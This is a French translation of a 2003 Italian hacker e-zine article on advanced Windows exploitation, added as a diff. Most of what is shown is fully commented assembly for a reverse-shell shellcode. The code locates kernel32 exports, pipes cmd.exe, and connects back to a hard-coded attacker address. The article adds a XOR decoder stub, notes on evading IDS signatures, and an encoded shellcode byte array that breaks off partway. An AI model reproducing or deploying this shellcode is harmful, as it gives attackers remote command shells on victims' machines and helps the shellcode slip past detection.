@@ -1,0 +1,1733 @@
+-[ BFi - version française ]--------------------------------------------------
+        BFi est une e-zine écritte par la communauté hacker italienne.
+        Les codes sources complets et la version originale en italien sont
+        disponible içi:
+                http://bfi.freaknet.org/dev/BFi12-dev-04
+                http://www.s0ftpj.org/bfi/dev/BFi12-dev-04
+        Version française traduite par tleil4X <tleil4x@tiscali.it>
+------------------------------------------------------------------------------
+
+
+
+==============================================================================
+-------------------[ BFi12-dev - fichier 04 - 24/03/2003 ]--------------------
+==============================================================================
+
+
+-[ DiSCLAiMER ]---------------------------------------------------------------
+        Tout le matériel contenu dans BFi a but esclusivement informatif et
+        éducatif. Les auteurs de BFi ne se chargent d'aucune responsabilité
+        pour des éventuel dommages à choses ainsi que à personnes, dus à
+        l'emploi de code, programmes, informations, techniques contenus dans
+        la revue.
+        BFi est un libre et autonome moyen d'éxpression; comme nous auteurs
+        nous sommes libres d'écrire BFi, tu est libre de continuer dans ta
+        lecture ou alors de t'arreter içi. Par conséquent, si tu te sens
+        outragé par les thèmes traités et/ou par la façon dont ils sont
+        traités, * interrompt immédiatement ta lecture et éfface ces fichiers
+        de ton ordinateur *.
+        En continuant, toi lecteur, tu te prends toute la responsabilité de
+        l'emploi que tu feras des indications contenus dans BFi.
+        Il est interdit de publier BFi sur les newsgroup et la diffusion de
+        *parties* de la revue: vous pouvez distribuer BFi tout entier et dans
+        ça forme originale.
+------------------------------------------------------------------------------
+
+
+
+-[ HACKiNG ]------------------------------------------------------------------
+---[ ADVANCED WiND0WS EXPL0iTiNG
+-----[ NaGa <crwm@freemail.it>
+       KiodOpz <max.chiodo@libero.it>
+
+
+
+///////////////////////////////////////////////////////////////////////////
+//                     ADVANCED WINDOWS EXPLOITING                       //
+//                                 by                                    //
+//                            NaGA & KiodOpz                             //
+///////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////
+// DISCLAIMER //
+////////////////
+
+Ceci ne veut être ni une collection d'exploits ni de techniques d'attaque pour
+Windows. Ce que nous allons décrire est seulement un ensemble de techniques et
+de concepts qui peuvent se rendre utiles dans le cas où nous essayons
+d'exploiter une vulnerabilité de Windows.
+Le code et les techniques contenus (à part où indiqué) ont été écrits et pensés
+par nous. Toutes les techniques ont été testées sur des systémes de NOTRE
+PROPRIETE et jamais pour endommager quelqu'un. Evidemment, si vous deciderez
+de les utiliser vous aussis, vous le ferez à vos risques et périls.
+
+
+
+//////////////////////////
+//  INDEX DES CONTENUS  //
+//////////////////////////
+
+0. Intro
+1. Reverse-shell shellcode pour Windows IA386
+2. JMP ESP Trick
+3. Unicode Shellcode Converter (n0stack)
+4. Introduction aux privilèges et au controle des accès
+5. Shellcode Privilege Escalation
+6. Encore sur l'escalation des privilèges
+7. C'est autant convenable être LOCAL_SYSTEM? (Logon Sessions)
+8. DLL Injection
+9. Conclusions et remerciements
+
+
+
+///////////////
+// 0- INTRO  //
+///////////////
+
+La nécessité aiguise l'ingéniosité.
+Qui fait de sois fait pour trois.
+
+
+
+///////////////////////////////////////////////////
+// 1- REVERSE-SHELL SHELLCODE POUR WINDOWS IA386 //
+///////////////////////////////////////////////////
+
+Une des choses plus importantes à se rappeler quand nous écrivont un shellcode
+pour Windows est que pour ce sympatique système opératif les filedescriptors
+et les descripteurs des sockets ne sont pas des objets interchangeables.
+Qu'est ce que ça veut dire tout cela? Trés simple. Pour permettre à l'attaquant
+d'intéragir de loin avec la shell, un shellcode pour linux standard aurait
+ouvert une sockect, il aurait passé le descripteur de la socket à son propre
+standard input, standard error et standard output, et il aurait en suite
+exécuter /bin/bash . A présent la shell aurait fait toutes les opérations de
+I/O avec l'usager à travers la socket ouverte.
+Sur Windows un'opération du genre échoura misérablement.
+Oui parce que les fonctions que cmd.exe (l'interprète des commandes) utilise
+pour lire et écrire sur stdin et stdout échouent si les descriptor en question
+repprésentes des socket.
+Pour détourner ce problème il faut utiliser la même technique que celle de la
+version pour Windows de netcat. En quelques mots il faut que notre shellcode
+ouvre la socket, exécute cmd.exe en envoyant stdin et stdout sur des pipe qu'il
+a creé et reste en écoute, comme un "proxy". Toutes les données reçues sur la
+socket devronts étre envoyées sur la pipe et vice versa.
+
+Et içi arrive le deuxième problème. D'abitude les shellcode n'utilisent pas les
+syscall, mais appèle directement les interrupt du système opératif pour garder
+un élevé niveau de relocabilité. Pour utiliser les appels du système il est
+nécessaire en connaitre leurs positions en memoire et il faut aussi que les
+libraries dans lequelles se trouve soit linkees (de façon dynamique ou
+statique) à l'executable que nous allons exploiter.
+Vu que notre shellcode devra gerer beaucoup d'operations, certaines même
+complexes, nous aurons besoin de nous appuyer aux API de Windows.
+Ainsi nous aurons la possibilité de developper les operations plus complexes
+sans devoir nous perdre dans les internals du système operatif.
+D'autre part nous devrons trouver une façon pour ne pas perdre la relocabilite
+du code, elément fondamental pour un shellcode. Nous aurons donc besoin
+d'implementer une espèce de fonction qui relocate de facon dynamique, et qui
+resous touts les simboles que nous avons besoin dans notre code, et qui utilise
+le moins possible d'adresses "hard-coded".
+Nous allons voir rapidement comment cet "objet mystérieux" devra fonctionner
+(pour les détails allez voir les commentaires du code reporté plus loin).
+
+La fonction clef pour cette procédure est GetProcAddress de la librairie
+kernel32.dll . GetProcAddress permet d'obtenir l'adresse de n'importe quelle
+fonction: elle demande en input l'handle de la librairie qui contient la
+fonction et le nom de la fonction même.
+Le problème de la "relocation dynamique" se reduit donc à la recherche de
+l'adresse de la fonction GetProcAddress.
+Nous donnont pour acqui que le code que nous allons exploiter ait un link a
+kernel32.dll (sauf quelques cas très rares, tous les executables ont ce link).
+La librairie kernel32 sera mapped sur une zone de mémoire de notre processus à
+une adresse toujour plus ou moin pareille. Cet adresse est choisi par le
+paramètre "ImageBase" de la librairie et elle peut changer, de pas beaucoup,
+selon la version.
+Notre shellcode devra avant tout "trouver" kernel32 dans la mémoire.
+Nous sommes aider dans cette opération par les premiers byte communs a toutes
+les librairies (MZ, l'incipit de l'header des vieux programmes DOS). Une fois
+que nous avons trouver en memoire l'header de kernel32 nous allons examiner
+sa section "Export" pour obtenir l'adresse de la fonction GetProcAddress.
+Obtenu cette adresse il nous sera simple relocater tous les autres symboles.
+Si nous voulions utiliser des fonctions qui se trouvent a l'interieur de
+différentes librairies (par example WinSock) nous pourrions utiliser la
+fonction LoadLibrary de kernel32 pour ouvrir la librairie (ou bien en prendre
+l'handle dans le cas ou elle soit déjà chargée); et puis à nouveau
+GetProcAddress .
+
+Enfin, içi arrive le troisième et dernier probléme. Comme peut-etre vous le
+savez, le plus grand ennemi des shellcode est le caractère \x00 . Une opération
+comme celle que nous avons à peine décrit demande beaucoup de zeros parmi les
+opcode et comme terminateurs des morceaus de texte envoyés a GetProcAddress .
+Pour éviter ce problème nous pouvons agir en suivant deux métodes différentes.
+Ou nous construisons notre shellcode en evitant les \x00 et nous préparons les
+morceaux pour GetProcAddress à runtime (en mémoire ou dans le stack, comme ils
+font certains worms) ou alors nous choisissons la métode de la "XOR-patch".
+Dans cet article nous allons examiner cette deuxième possibilité (qui est aussi
+la plus simple à utiliser).
+
+En peut de mots nous fesons le XOR de tout notre shellcode avec un byte qui ne
+soit pas déjà contenu dans le code (sinon nous allons créer d'autres \x00 !!!)
+et au debut de notre shellcode nous y mettons une simple routine qui, au moment
+d'exécution, "decrypte" le code, en fesant à nouveau un XOR avec le même byte
+utilisé auparavant. Evidemment, la routine de decrypt ne devra pas contenir le
+caractere \x00 (plus tard on en verra une).
+
+Nous pouvont allor passer tout de suite au code commenté que j'espère il puisse
+enclairer tous vos doubtes.
+
+<-| awex/reverse_shell.s |->
+ ;***********************************************************************
+ ;* Ce shellcode exécute l'interprète des commandes cmd.exe et contacte *
+ ;* en arrière l'attaquant à une adresse et une porte specifiées à      *
+ ;* l'intérieur (hard-coded).                                           *
+ ;* Le code est une version modifié et amelioré du shellcode original   *
+ ;* écrit par RFP                                                       *
+ ;***********************************************************************
+
+
+ ;*****************************************************************************
+ ; Nous commencons par chercher dans la mémoire l`adresse de l`header de
+ ; kernel32.dll.
+ ; Vu que cette adresse peut changer, nous partons par 0x77F00000 et nous
+ ; allons en arriére à la recherche des 4 byte avec lequels tous les header
+ ; commencent.
+
+                   mov         eax,77F00000h
+Label1:
+                   cmp         dword ptr [eax],905A4Dh ; il voit ci c'est
+						       ; un header MZ
+	           je          Label2
+	           dec         eax		; il scanne en arrière
+						; la mémoire
+	           jmp         Label1
+
+ ;*****************************************************************************
+ ; Trouvé l'adresse base de kernel32, nous récupérons l'adresse de la partie
+ ; des données de notre shellcode. Dans la partie des données ils sont contenus
+ ; les noms des fonctions et des librairies que nous allons utiliser en suite.
+ ; La fonction de résolution utilisera la même partie des données pour
+ ; mémoriser l'adresse des symboles une fois qu'ils soient resolus.
+
+Label2:
+	           call        Find_Me		; Récupère le pointeur
+Find_Me:
+	           pop         ebp              ; à l'instruction successive.
+	           mov         edx,ebp          ; Avec ce pointeur
+	           sub         edx, 0fffffe11h	; il calcole l'adresse initiale
+                                                ; de la partie des données du
+						; code
+
+ ;*****************************************************************************
+ ; Nous allons à présent éxaminer l'header de kernel32 pour en trouver la
+ ; section des Export .
+ ; Toutes les adresses obtenus sont RVA , donc il va falloir toujour sommer
+ ; l'ImageBase trouver auparavant.
+
+	           mov         ebx,eax
+	           mov         esi,dword ptr [ebx+3Ch] ; pointeur à l'header
+						       ; NewExe (PE)
+	           add         esi,ebx
+	           mov         esi,dword ptr [esi+78h] ; pointeur dans l'header
+						       ; PE à la ExportTable
+	           add         esi,ebx
+
+ ;*****************************************************************************
+ ; Chaque fonction de librairie peut étre exportée avec le nom ou seulement
+ ; avec l'ordinal.
+ ; La fonction GetProcAddress est exporter grace au le nom.
+ ; La section de export a plusieurs tableaux. Celles qui nous intéressent sont
+ ; l'index des noms e l'index des pointeurs à fonction. L'index des noms a
+ ; génerallement un ordre alphabétique, différent donc de celui du tableau des
+ ; pointeurs à fonction.
+ ; En outre le tableau des pointeurs à fonction contient aussi des lignes pour
+ ; les fonctions exportées par ordinal (donc pas présentes dans la liste des
+ ; noms). Pour linker les deux listes il-y-a un troisième tableau (entries de
+ ; 2 byte) qui fais correspondre à chaque élément de la liste des noms un
+ ; élément de la liste des pointeurs à fonction.
+ ; Pour obtenir le pointeur à GetProcAddress il va donc falloir lire la liste
+ ; des noms et trouver l'index de la fonction qui nous intéresse. Obtenu cet
+ ; index nous allons pouvoir lire la liste des "link" pour trouver l'index de
+ ; GetProcAddress à l'interieur de la liste des pointeurs à fonction.
+ ; Finallement, en lisant cette dernière liste nous obtenons l'adresse le la
+ ; fonction que nous cherchions.
+ ; Pour plus de détails sur comment est structuré la section de export allez
+ ; voir le très bon tutorial http://203.157.250.93/win32asm/pe-tut7.html
+
+	           mov         edi,dword ptr [esi+20h] ; Adresse du tableau
+						       ; des noms exportés
+	           add         edi,ebx
+
+	           xor         ebp,ebp		; ebp sera utilisé comme
+						; index dans le tableau
+	           push        esi
+
+Label4:
+	           push        edi
+	           mov         edi,dword ptr [edi] ; Offset du pointeur au
+					           ; premier symbole
+	           add         edi,ebx
+	           mov         esi,edx		; pointeur à notre zone de
+						; données qui contient le texte
+						; "GetProcAddress"
+	           mov         ecx,0Eh		; la comparazione
+						; Longueur du morceau de texte
+						; pour la comparaison
+	           repe cmps   byte ptr [esi],byte ptr [edi] ; ça verifie que
+							     ; se soit le
+							     ; symbole
+							     ; "GetProcAddress"
+	           je          Label3		; Si ça correspond nous
+						; pouvont continuer sinon
+	           pop         edi		; nous allons au pointeur au
+						; deuxième symbole exporté
+	           add         edi,4
+	           inc         ebp		; incrementation de l'index
+	           loop        Label4   	; et continuation de la
+						; recherche.
+
+Label3:
+	           pop         edi
+	           pop         esi
+	           mov         ecx,ebp		; Index de GetProcAddress
+						; dans le tableau des noms
+	           mov         eax,dword ptr [esi+24h] ; Offset du tableau
+						       ; des "link" des
+						       ; ordinaux
+	           add         eax,ebx
+	           shl         ecx,1		; Chaque ligne du tableau de
+						; "link" est 2 byte
+	           add         eax,ecx
+	           xor         ecx,ecx
+	           mov         cx,word ptr [eax] ; Index de GetProcAddress
+						 ; dans la liste des pointeurs
+						 ; à function
+	           mov         eax,dword ptr [esi+1Ch] ; Adresse tableau des
+						       ; pointeur à fonction
+	           add         eax,ebx
+	           shl         ecx,2		; Chaque ligne est 4 byte (ce
+						; sont des pointeurs!)
+	           add         eax,ecx
+	           mov         eax,dword ptr [eax]
+	           add         eax,ebx		; pointeur à GetProcAddress
+						; (!!!)
+
+ ;*****************************************************************************
+ ; Nous utilisons la fonction RelocFunc pour résoudre le symboles de kernel32
+ ; qui restent; nous les utiliserons en suite. La fonction RelocFunc est
+ ; définie après.
+
+	           mov         esi,edx		; pointeur à notre zone de
+						; données
+	           mov         edi,esi
+	           mov         edx,eax		; Adresse de GetProcAddress
+	           mov         ecx,0Bh          ; Nombre de symboles à résoudre
+	           call        RelocFunc	; Fonction de résolution
+
+ ;*****************************************************************************
+ ; A présent RelocFunc aura résolue tous les symboles de kernel32 qui nous
+ ; servirons et elle aura mit les adresses dans la partie données, selon le
+ ; même ordre avec lequel nous avons inséré les textes.
+ ; Nous allons donc utiliser edi pour adresser notre partie données et des call
+ ; indrectes pour rappeler les fonctions de librairie.
+ ;
+ ; Quand RelocFunc sera finie, esi pointera au dernier symbole resolu.
+ ; Il va donc falloir "sauter" ce morceau de texte pour arriver dans la part
+ ; des données au nom de la deuxième librairie que nous voulons utiliser
+ ; (WSOCK32), suivie part tous les symboles de cette librairie que nous devrons
+ ; résoudre.
+
+Label5:
+	           xor         eax,eax	       ; Déplace esi au début de
+					       ; WSOCK32
+	           lods        byte ptr [esi]
+	           test        eax,eax
+	           jne         Label5
+
+	           push        edx
+	           push        esi
+	           call        dword ptr [edi-2Ch] ; LoadLibrary("WSOCK32")
+	           pop         edx
+
+	           mov         ebx,eax
+	           mov         ecx,6		; Nombre de symboles à résoudre
+	           call        RelocFunc	; Résou les symboles de WSOCK32
+
+ ;*****************************************************************************
+ ; Nous avons à présent chargé e resolu tous les symboles nécessaire.
+ ; Nous pouvont ainsi passer à la creation des pipe que nous utiliserons pour
+ ; faire comuniquer notre shellcode avec l'interprète des commandes (cmd.exe)
+
+	 ; Définissons une structure Security_Attributes nécessaire à la
+	 ; creation de la pipe.
+	 ; Nous établissons le deuxième champ à zéro (lpSecurityDesciptor), ce
+	 ; qui equivaut à assigner à la pipe le DefaultSecurityDescriptor du
+	 ; processus qui l'a appelé. Ce descripteur de default garantira
+         ; l'accés à la pipe de la part de toutes les entités qui aient le même
+         ; Access Token du processus qui a creé la cette pipe. Si, comme nous
+         ; allons voir, nous aurons besoin de faire accéder à la pipe même des
+	 ; processus qui marchedans un Security Context différent de celui qui
+	 ; l'a créé, il nous faudra specifier içi une custom DACL pour concéder
+	 ; les droits d'accés désirer.
+
+	   ; PIPE1 (edi pointe à l'intérieur de notre zone des données)
+           mov         dword ptr [edi+64h],0Ch	; Longueur structure
+           mov         dword ptr [edi+68h],0 	; lpSecurityDescriptor
+           mov         dword ptr [edi+6Ch],1 	; InheritHandle (nous voulons
+						; que ce descripteur soit
+						; hérité aussi par les proc
+						; fils)
+           push        0
+           lea         eax,[edi+64h]		; Pointeur à la structure
+						; SecurityAttributes créé
+           push        eax
+           lea         eax,[edi+10h] 		; Nous utilisons edi+10 et
+						; edi+14 pour garder le
+	   push        eax                     	; read_handle et le
+						; write_handle que la
+						; fonction CreatePipe
+           lea         eax,[edi+14h] 		; nous retournera
+           push        eax
+           call        dword ptr [edi-40h]	; CreatePipe(&read_handle,
+						; &write_handle,
+						; lpSecurityDescriptor, size=0)
+
+           ; PIPE2
+           push        0
+           lea         eax,[edi+64h]
+           push        eax
+           lea         eax,[edi+18h]
+           push        eax
+           lea         eax,[edi+1Ch]
+           push        eax
+           call        dword ptr [edi-40h] 	; CreatePipe
+
+ ;*****************************************************************************
+ ; Maintenant nous allons s'occuper d'éxecuter cmd.exe . Pour faire ça nous
+ ; nous servons de la fonction CreateProcess.
+ ; CreateProcess a besoin, entre autres paramètres, d'une structure
+ ; StartUpInfo. Cette structure permet, entre autre, de spécifier les handle
+ ; que le nouveau processus utilisera comme stdin, stdout et stderr.
+ ; Pour établir de façon automatique tous les autres paramètres qui nous
+ ; intéressent pas, nous utiliserons la fonction GetStratUpInfo pour récupérer
+ ; la structure StartUpInfo du processus qui l'appèle.
+ ; Après avoir modifié les handle que cmd.exe devra utiliser (nos deux pipe),
+ ; nous prendrons cette structure comme un paramètre de CreateProcess.
+
+           mov         dword ptr [edi+20h],44h
+           lea         eax,[edi+20h]
+           push        eax
+           call        dword ptr [edi-3Ch]	; GetStartUpInfo(lpStartUpInfo)
+
+           mov         eax,dword ptr [edi+10h]	; specifit le write_handle de
+						; PIPE1
+           mov         dword ptr [edi+5Ch],eax 	; comme stdout et stderr
+           mov         dword ptr [edi+60h],eax
+           mov         eax,dword ptr [edi+1Ch]	; et le read_handle de PIPE2
+						; comme stdin .
+           mov         dword ptr [edi+58h],eax
+           or          dword ptr [edi+4Ch],101h	; Il specifit que les champs de
+						; la structure de rédirection
+           mov         word ptr [edi+50h],0 	; des handle sont valide.
+
+           lea         eax,[edi+70h] 		; CreateProcess nous retournera
+						; une structure
+           push        eax			; Process_Information que nous
+						; sauverons dans une zone de la
+						; partie des données inutilisée
+
+           lea         eax,[edi+20h]		; pointeur à la structure
+						; StartUpInfo
+           push        eax			; définit auparavant.
+           xor         eax,eax
+           push        eax			; Quelques paramètres qui nous
+						; interessent pas...
+           push        eax
+           push        eax
+           push        1			; hInheritHandles (nous
+						; specifions que le processus
+						; fils héritera les
+						; descripteurs ouverts)
+           push        eax
+           push        eax
+           call        Label6 			; Nous récupérons l'adresse au
+						; texte cmd.exe
+Label6:						; contenue dans notre partie
+						; des données
+           pop         ebp
+           sub         ebp,0FFFFFE3Ch
+           push        ebp			; lpCommandLine (cmd.exe)
+           push        eax
+           call        dword ptr [edi-38h]	; CreateProcess (NULL,
+						; "cmd.exe",.....)
+
+	; Nous fermons les handle des pipe que le processus père n'utilisera
+	; pas
+
+           push        dword ptr [edi+10h]
+           call        dword ptr [edi-1Ch]	; CloseHandle
+						; (write_handle_PIPE1)
+
+           push        dword ptr [edi+1Ch]
+           call        dword ptr [edi-1Ch]	; CloseHandle
+						; (read_handle_PIPE2)
+
+ ;*****************************************************************************
+ ; Nous allons allouer une zone de mémoire (400 byte) pour l'utiliser comme
+ ; buffer de lecture et nous initialisons les socket
+
+           push        400h 			; Dimention
+           push        40h 			; La mémoire est initialisée
+	   					; à zero
+           call        dword ptr [edi-30h]	; GlobalAlloc (Attribute=0x40,
+						; Size=0x400)
+
+           mov         ebp,eax
+           push        eax 			; Nous utilisons la zone de
+						; mémoire juste allouer pour
+           push        101h			; sauver les informations que
+						; nous retournera WSAStartUp
+
+           call        dword ptr [edi-18h]	; WSAStartUp (Version=101,
+						; lpWSAData)
+           test        eax,eax
+           jne         Exit_Proc		; Si il failli il sort du
+	   					; processus
+
+ ;*****************************************************************************
+ ; C'est le moment de créer la socket et de faire la connect vers l'adresse et
+ ; la porte hard-coded
+
+           xor         eax,eax
+           push        eax
+           inc         eax
+           push        eax 			; SOCK_STREAM
+           inc         eax
+           push        eax 			; AF_INET
+           call        dword ptr [edi-14h]	; socket(2,1,0)
+           cmp         eax,0FFh
+           je          Exit_Proc		; Si il failli il sort
+           mov         ebx,eax			; Déplace l'handle de la
+						; socket en ebx
+
+           mov         word ptr [edi],2 	; Nous construisons, toujour
+	   					; dans notre zone des données,
+						; une structure sockaddr
+						; nécessaire pour la connect
+           mov         word ptr [edi+2], 0BBBBh	; Porte destination Hard-Coded
+           mov         dword ptr [edi+4], 0AAAAAAAAh  ; Adresse de destination
+						      ; Hard-Coded
+           push        10h 			; Longueur structure
+           lea         eax,[edi]
+           push        eax
+           push        ebx
+           call        dword ptr [edi-0Ch]	; connect(socket,
+						; sockaddr = edi, len = 16
+						; bytes)
+
+ ;*****************************************************************************
+ ; Nous començons un cycle infinit dans lequel nous fesons "polling" sur la
+ ; socket et sur les pipe. Toutes les données reçues de la socket seront
+ ; écrites sur la pipe et viçeversa.
+
+Poll_Loop:
+            push        32h			; Petite temporisation de 50
+						; millisecondes
+           call        dword ptr [edi-24h]	; sleep(50)
+
+           xor         ecx,ecx 			; Nous établissons à zéro tous
+						; les paramètres de la fonction
+           push        ecx 			; qui nous intéressent pas.
+           push        esi			; Nous utilisons PeekNamedPipe
+						; pour voir si ils y sont des
+           push        ecx			; byte à lire sur la PIPE1.
+           push        ecx 			; Le nombre de byte sera
+						; sauvegardé dans le lieu
+           push        ecx			; pointé par esi (dans notre
+						; partie de données)
+           push        dword ptr [edi+14h]
+           call        dword ptr [edi-34h]	; PeekNamedPipe
+						; (read_handle_PIPE1, ...)
+
+           test        eax,eax			; Si il failli il ferme la
+	   je          Close_and_Exit		; socket et il sort
+
+           nop					; Nous utilisons les nop pour
+           nop 					; implémenter une rudimentale
+           nop					; temporisation
+           nop
+           cmp         byte ptr [esi],0		; Si il n'y a pas de byte à
+						; lire sur la pipe, il fait
+           je          Label7			; le polling de la socket
+           nop
+           nop
+           nop
+           nop
+
+	   ; ça lit les données qui sont disponible sur la pipe
+           push        0 			; Nous nous servons pas de
+	   					; overlap
+           push        esi 			; Pointeur aux byte lus
+           push        400h 			; Numéro max byte à lire
+           push        ebp 			; buffer alloué avec
+						; GlobalAlloc
+           push        dword ptr [edi+14h] 	; handle de la pipe
+           call        dword ptr [edi-28h]	; ReadFile(read_handle_PIPE1,
+						; buffer, len=400, ...)
+           test        eax,eax
+           je          Close_and_Exit		; Si ça ne marche pas il ferme
+						; le socket et il sort
+
+           nop
+           nop
+           nop
+           nop
+
+	   ; ça envoi les données lues sur la socket
+           push        0
+           push        dword ptr [esi] 		; ReadFile avait sauvegardé
+						; dans le lieu pointé par esi
+						; le nombre de byte lu sur la
+						; pipe qui seront notre "len".
+           push        ebp			; Buffer contenant les données
+						; lues.
+           push        ebx			; Handle de la socket
+           call        dword ptr [edi-8]	; send (socket, buffer, len, 0)
+           cmp         eax,0FFh
+           je          Close_and_Exit		; Si ça ne marche pas il ferme
+						; le socket et il sort
+
+           nop
+           nop
+           nop
+           nop
+           jmp         Poll_Loop		; Il recommence le cycle de
+						; Polling
+
+Label7:
+	   ; ça lit les données de la socket (si il y en a)
+           push        0
+           push        400h 			; Nombre byte
+           push        ebp 			; Pointeur buffer
+           push        ebx 			; Handle socket
+           call        dword ptr [edi-4]	; recv(socket, buffer, 400,...)
+           test        eax,eax
+           jl          Close_and_Exit		; Si ça ne marche pas il ferme
+						; le socket et il sort
+
+           nop
+           nop
+           nop
+           nop
+
+           je          Poll_Loop		; Si il n'y a pas de byte à
+						; lire il recommence le cycle
+						; de Polling
+
+	   ; si il a lu des données sur la socket il les envoi sur la pipe
+           push        0
+           push        esi
+           push        eax 			; Nombre de byte à écrire
+           push        ebp 			; Pointeur au buffer
+           push        dword ptr [edi+18h] 	; Write_handle_PIPE2
+           call        dword ptr [edi-2Ch]	; WriteFile(write_handle_PIPE2,
+						; buffer, len, ...)
+
+           push        32h
+           call        dword ptr [edi-24h]	; sleep(50)
+           jmp         Poll_Loop		; Recommence le cycle de
+						; Polling
+
+
+ Close_and_Exit:
+           push        ebx
+           call        dword ptr [edi-10h]	; CloseSocket (socket)
+
+ Exit_Proc:
+           push        0
+           call        dword ptr [edi-20h]	; ExitProcess (0)
+ 						; Parfois ça peut étre plus
+						; comode utiliser
+						; ExitThread. Aller voir
+						; l'explication sur la zone
+						; des données pour plus
+						; d'informations
+
+ ;*****************************************************************************
+ ; RelocFunc
+ ;
+ ; Il résou avec GetProcAddress les symboles à importer et il les sauvegarde
+ ; dans la zone données
+ ;
+ ; ARGS: edx = adresse de GetProcAddress
+ ;       esi = pointeur aux textes qu'il faut résoudre
+ ;       edi = pointeur à la zone ou seront sauvegardés les adresses
+ ;       ecx = nombre des symboles à résoudre
+ ;       ebx = BaseAddress de la librairie de laquelle nous voulons résoudre
+ ;             les symboles
+ ;
+ ; La première fois que cette fonction est appelée, esi sera égal à edi.
+ ; Les adresses résolus, en effect, seront sauvegardées en reécrivant dessus
+ ; les noms des symboles.
+ ; Heureusement tous les noms des fonctions seront plus long de 4 byte
+ ; (taille de l'adresse), et donc RelocFunc reécrira seulement les noms de
+ ; symboles déjà alloués.
+
+RelocFunc:
+
+           xor         eax,eax 			; ça cherche le premier symbole
+						; à resoudre
+           lods        byte ptr [esi]           ; (la première fois il saute
+						; GetProcAddress qui a déjà été
+           test        eax,eax 			; résolu, la deuxième fois
+						; il saute WSOCK32)
+           jne         RelocFunc
+
+           push        ecx 			; Les registres nécessaire sont
+           push        edx			; sauvegardés
+
+           push        esi 			; Pointeur au symbole à
+						; résoudre
+           push        ebx 			; BaseAddress de la librairie
+           call        edx 			; GetProcAddress(library,
+						; symbol)
+
+           pop         edx
+           pop         ecx
+
+           stos        dword ptr [edi] 		; Sauvegarde l'adresse obtenue
+           loop        RelocFunc		; Realloue le symbole succéssif
+           ret
+<-X->
+
+A la fin du shellcode il devra y étre notre zone des données.
+Cette zone devra contenir en ordre:
+
+- Le nom de toutes les fonctions de kernel32 que nous utiliserons.
+- Le mom de l'ultérieure librairie que nous voulons utiliser (WSOCK32).
+- Les noms de toutes les fonctions de WSOCK32 que nous utiliserons.
+- Le nom de la commande à lancer (cmd.exe).
+
+et devrait apparaitre plus ou moin comme ça:
+
+   47 65 74 50 72 6F 63 41 64 64 72   GetProcAddr
+   65 73 73 00 4C 6F 61 64 4C 69 62   ess.LoadLib
+   72 61 72 79 41 00 43 72 65 61 74   raryA.Creat
+   65 50 69 70 65 00 47 65 74 53 74   ePipe.GetSt
+   61 72 74 75 70 49 6E 66 6F 41 00   artupInfoA.
+   43 72 65 61 74 65 50 72 6F 63 65   CreateProce
+   73 73 41 00 50 65 65 6B 4E 61 6D   ssA.PeekNam
+   65 64 50 69 70 65 00 47 6C 6F 62   edPipe.Glob
+   61 6C 41 6C 6C 6F 63 00 57 72 69   alAlloc.Wri
+   74 65 46 69 6C 65 00 52 65 61 64   teFile.Read
+   46 69 6C 65 00 53 6C 65 65 70 00   File.Sleep.
+   45 78 69 74 50 72 6F 63 65 73 73   ExitProcess
+   00 43 6C 6F 73 65 48 61 6E 64 6C   .CloseHandl
+   65 00 57 53 4F 43 4B 33 32 00 57   e.WSOCK32.W
+   53 41 53 74 61 72 74 75 70 00 73   SAStartup.s
+   6F 63 6B 65 74 00 63 6C 6F 73 65   ocket.close
+   73 6F 63 6B 65 74 00 63 6F 6E 6E   socket.conn
+   65 63 74 00 73 65 6E 64 00 72 65   ect.send.re
+   63 76 00 63 6D 64 2E 65 78 65 00   cv.cmd.exe.
+
+N.B.
+ Quand le shellcode sort il appèle la fonction ExitProcess.
+ Si le programme que nous exploitions est multithread il ce peut qu'il
+ soit plus convenable utiliser la ExitThread tandis que la ExitProcess.
+ De cette façon seulement le thread exploité sortira, et pas le processus
+ entier, qui pourra continuer normalement son exécution (dans la plupart
+ des cas).
+ Pour utiliser ExitThread à la place de ExitProcess il suffit de changer
+ le nom de la fonction dans la zone des données; les paramètres des deux
+ fonctions sont les mêmes. Mais la longueur des deux noms de fonction est
+ différente, e donc il faut ajouter un byte nul avant "cmd.exe" pour
+ laisser ce morceau au même offset de la partie du code qui l'utilise
+ (CreateProcess).
+ Tout le reste peut étre laisser comme ça comme il est.
+ A la fonction de résolution des symboles, en effect, ça ne lui intéresse
+ pas où commence les différents morceaux de texte, mais seulement leurs
+ ordres.
+
+Comme nous avons auparavant dit, une fois que le shellcode est assemblé, il
+faut tout le XORer (partie des données comprise) avec un byte pas contenu à
+l'intérieur, pour éliminer les \x00 .
+En tête au code XORé il faudra y insérer une petite routine qui le déchiffre
+à run-time.
+En voiçi une qui ne contient aucun \x00 et qui utilise \x12 (pas présent
+dans le code) comme masque pour le XOR:
+
+<-| awex/XOR_patch.s |->
+	    jmp		Xor_Label1
+Xor_Label3:
+	    pop		eax
+	    jmp		Xor_Label2
+Xor_Label1:
+	    call	Xor_Label3
+Xor_Label2:
+	    add		eax, 0fh		; Longueur de la xor
+						; patch
+	    xor		ecx, ecx
+	    mov		cx, 2d5h		; Longueur du shellcode à
+						; déchifrer
+Xor_Label4:
+	    xor		byte ptr [eax], 12h	; Byte que nous avons choisi
+						; pour le xor
+	    inc		eax
+	    loop	Xor_Label4
+<-X->
+
+N.B.
+ Quelques IDS peuvent faire pattern matching à la recherche d'exploits.
+ Vu que le reste du shellcode peut être offusqué à plaisir, en changant
+ le byte du XOR, la seule partie du shellcode qui pourrait étre facilement
+ identifiée est justement la XOR patch.
+ C'est inutile dire que cette partie là peut étre elle aussi rendu plus
+ "stealth", en ajoutant des nop ou des instructions qui ne font rien.
+
+Après avoir XORé le code et ajouter au début la routine de décryptation,
+le tout devrait apparaitre comme ça:
+
+<-| awex/shellcode.c |->
+unsigned char shellc[] =
+"\xEB\x03\x58\xEB\x05\xE8\xF8\xFF\xFF\xFF\x83\xC0\x0F\x33\xC9\x66\xB9\xD5\x02\x80\x30\x12\x40\xE2\xFA"
+"\xAA\x12\x12\xE2\x65\x93\x2A\x5F\x48\x82\x12\x66\x11\x5A\xF9\xE7\xFA\x12\x12\x12\x12\x4F\x99\xC7\x93"
+"\xF8\x03\xEC\xED\xED\x99\xCA\x99\x61\x2E\x11\xE1\x99\x64\x6A\x11\xE1\x99\x6C\x32\x11\xE9\x21\xFF\x44"
+"\x45\x99\x2D\x11\xE9\x99\xE0\xAB\x1C\x12\x12\x12\xE1\xB4\x66\x15\x4D\x91\xD5\x16\x57\xF0\xFB\x4D\x4C"
